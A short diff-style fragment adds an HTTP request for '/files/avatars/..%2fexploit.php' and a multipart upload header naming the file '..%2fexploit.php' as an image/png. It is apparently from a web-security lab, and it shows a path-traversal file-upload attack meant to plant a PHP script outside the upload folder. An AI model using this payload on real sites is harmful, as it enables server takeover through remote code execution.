@@ -1,0 +1,6 @@
+GET /files/avatars/..%2fexploit.php HTTP/1.1
+
+....
+
+Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
+Content-Type: image/png
